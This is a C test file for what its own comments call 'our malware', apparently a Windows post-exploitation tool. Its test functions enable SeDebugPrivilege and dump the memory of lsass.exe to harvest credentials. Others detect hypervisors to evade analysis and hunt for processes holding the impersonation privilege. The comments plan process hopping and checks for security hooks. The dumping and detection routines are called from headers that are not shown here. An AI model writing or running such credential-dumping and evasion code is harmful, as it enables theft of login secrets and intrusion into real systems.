#include "Lsass_Dumper.h"
#include "Handle_Process.h"
#include "Hypervisor_Detector.h"

/*
 *This test will give us an idea on how we should do our menu
 *One thing to note is that, we should keep the handles we open in array (FILO)
 *Should we keep them in memory?And for how long? Apply circular queue concept?
 *Also keep tokens in a array + check they're validity, if not valid remove it from it
 * Move our malware from process to process??
 * check if there's hook on opening a process
/*This test will give us an idea on how we should do our menu*/

void TestDiplayPrivs()
{
	title("TEST - Display Privileges\n");

	if (DisplayPrivs(GetCurrentProcess()))succ("The display of privileges has been done succesfully\n");
	else warn("The display of privileges encountered some problems...\n");
}

void TestIsProcessElevated()
{
	title("TEST - Token Privilege of a process\n");

	if (isProcessElevated(GetCurrentProcess())) succ("The token has elevated privileges!\n");
	else warn("The token does not have elevated privileges...\n");
}

void TestGetProcId()
{
	title("TEST - Get The ID Of A Process\n");

	const wchar_t* procName = L"lsass.exe";
	DWORD procId = GetProcIdByName(procName);

	info("Getting the PID %ls ", procName);

	if (procId != 0)succ("The PID : %lu\n", procId);
	else warn("Could not get the PID, error: %lu\n", GetLastError());
}

void TestGetLuidValue()
{
	title("TEST - Get The Luid Of A Privilege\n");

	LUID luid = GetLuidValue(L"SeDebugPrivilege");

	info("Luid of privilege %ls, is (%lu,%lu)\n", SE_DEBUG_NAME, luid.LowPart, luid.HighPart);
}

void TestHasPrivilege()
{
	title("TEST - Has Privilege\n");

	wchar_t* privName = SE_IMPERSONATE_NAME;

	if (HasPrivilege(privName, GetCurrentProcess()))succ("This process token has the %ls privilege!\n", privName);
	else warn("This process token does not have %ls has a privilege...\n", privName);
}

void TestSetPrivilege()
{
	title("TEST - Set Privilege to Enable/Disable\n");

	HANDLE hProcess = GetCurrentProcess();
	wchar_t* privName = L"SeDebugPrivilege";

	if (HasPrivilege(privName, hProcess))
	{
		if (SetPrivilege(privName, hProcess, TRUE))succ("%ls has been adjusted on this process token!\n", privName);
		else warn("The privilege could not be adjusted...\n");
	}else warn("The process token privilege %ls could not be adjusted, because you the process does not have it...\n",privName);
}

void TestLsassDump()
{
	title("TEST - Lsass Dump\n");

	DWORD procId = GetProcIdByName(L"lsass.exe");

	if (procId != 0) {
		if (SetPrivilege(SE_DEBUG_NAME, GetCurrentProcess(), TRUE))
			Dump(procId);
	}
	else warn("Error: %lu\n", GetLastError());
}

void TestGetBIOSVendorName()
{
	title("TEST - Get BIOSVendor Name\n");

	GetBIOSVendorName();
}

void TestHypervisorDetector()
{
	title("TEST - Hypervisor Detector\n");
	
	DetectHyperV();
}

void TestFindProcessWithPrivilege()
{
	title("TEST - Find Process With Specific Privilege\n");

	FindProcessWithPrivilege(SE_IMPERSONATE_NAME);
}

void TestEnumerateProcesses()
{
	title("TEST - EnumerateProcesses\n");

	EnumerateProcesses();
}

int main()
{
	title("=================Start Test=====================\n");

	//TestDiplayPrivs();
	//TestIsProcessElevated();
	//TestGetProcId();
	//TestGetLuidValue();
	//TestHasPrivilege();
	//TestSetPrivilege();
	//TestLsassDump();
	//TestGetBIOSVendorName();
	//TestHypervisorDetector();
	//TestFindProcessWithPrivilege();
	TestEnumerateProcesses();


	title("=================End Test=====================\n");
}

